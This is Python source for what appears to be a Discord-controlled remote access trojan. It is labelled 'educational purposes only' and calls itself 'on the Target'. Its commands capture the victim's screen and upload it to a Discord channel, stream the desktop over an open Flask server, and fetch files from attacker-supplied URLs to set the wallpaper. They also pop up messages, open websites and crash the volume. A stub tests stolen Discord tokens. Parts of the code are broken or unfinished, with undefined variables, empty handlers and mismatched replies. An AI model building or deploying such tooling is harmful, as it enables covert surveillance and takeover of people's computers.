import discord
import pyvolume
import requests
import mouse
import os
import uuid
import config
import webbrowser
import ctypes
import turtle
from pynput.mouse import Controller
from windows_capture import WindowsCapture, Frame, InternalCaptureControl
from flask import Flask, Response
import mss, cv2, numpy as np
from discord.ext import commands
from PIL import Image 
from PIL import ImageGrab
app = Flask(__name__)




##  ┌─────────────────────────┐ 
##  │        IMPORTANT        │
##  │                         │
##  │   EDUCATIONAL PURPOSES  │
##  │          ONLY           │
##  │     -- DONT LARP --     │
##  │                         │
##  │                         │
##  │                         │
##  │                         │
##  └─────────────────────────┘ 


capture = WindowsCapture(
    cursor_capture=None,
    draw_border=None,
    monitor_index=None,
    window_name=None,
)

is_locked = True
UNLOCK_KEY = 'f10'
lock_x, lock_y = mouse.get_position()
p = config.path

class Client(discord.Client):
    async def on_message(self,message):
        if message.author == self.user:
            return
        if message.content.startswith('!img'):
            img = ImageGrab.grab(config.bbox, config.layer, config.allscreens, config.xdisplay, config.window)
            img.save(p)
            file = discord.File(p,config.spoil)
            await message.channel.send('Here Your Image!')
            await message.channel.send(file=file)
            os.remove(img)
            

        if message.content.startswith('!shell'):
            await message.channel.send('Here Your Commands!')

        if message.content.startswith('!mouse'):
            await message.channel.send(f'Mouse Position Set at ! {message.content}')

        if message.content.startswith('!volumecrash'):
            for i in range(100):
                pyvolume.custom(percent=i)
            await message.channel.send(f'Volume Crashed Successfully {i}')
  
        if message.content.startswith("!write "):
            text = message.content.split(" ", 1)[1]

            WS_EX_TOPMOST = 0x40000

            pp = config.pp

            img = ImageGrab.grab()
            img.save(pp)

            file = discord.File(pp, spoiler=True)

            ctypes.windll.user32.MessageBoxExW(
                None,
                text,
                config.windowTitle,
                WS_EX_TOPMOST
            )

            await message.channel.send(file=file)
            await message.channel.send("Done!")







            

        if message.content.startswith("!download "):
            i = message.content.split(" ", 1)[1]
            url = i
            requests.get(download_link, stream=True)
            await message.channel.send(f'You Wrote {i} on the Screen')

        if message.content.startswith("!website "):
            i = message.content.split(" ")[1]
            url = i
            webbrowser.open_new(url)
            await message.channel.send(f'Opened {i}')

        if message.content.startswith("!wallpaper "):
            image = message.content.split(" ", 1)[1]

            url = image

            r = requests.get(url)

            path = r"PATH"

            with open(path, "wb") as f:
                f.write(r.content)

            ctypes.windll.user32.SystemParametersInfoW(
            20,
            0,
            path,
            0x01 | 0x02
            )
            img = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None, window=None)
            img.save(p)
            file = discord.File(p,spoiler=True)
            await message.channel.send(file=file)
            os.remove(img)
            if image:
                await message.channel.send("Wallpaper changed!")
            else:
                await message.channel.send("Wrong Wallpaper | Use Pinterest")
            
            
        if message.content.startswith("!capture "):
            def screen():
                while True:
                    frame = np.array(ImageGrab.grab())
                    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                    _, jpeg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    yield (b'--frame\r\n'
                            b'Content-Type: image/jpeg\r\n\r\n' + jpeg.tobytes() + b'\r\n')

            @app.route('/')
            def video():
                    return Response(screen(), mimetype='multipart/x-mixed-replace; boundary=frame')

            app.run(host='0.0.0.0', port=5000)

            await message.channel.send(f'Started at {app.run.host}')


        if message.content.startswith('!info'):
            if client.is_ready():
                await message.channel.send('Linus is Currently on the Target!')
   
    
        if message.content.startswith('!exit'):
            await message.channel.send('Linus is leaving')
            await client.close()

        if message.content.startswith('!token'):
            def test(token: str) -> None:
                response = requests.get(
                    url="https://discord.com/api/v9/users/@me",
                    headers={"Authorization": token}
                )
                print(response.json())

intents = discord.Intents.default()
intents.message_content = True




client = commands.Bot(config.prefix, intents=discord.Intents.default())

client = Client(intents=intents)
client.run(config.token)



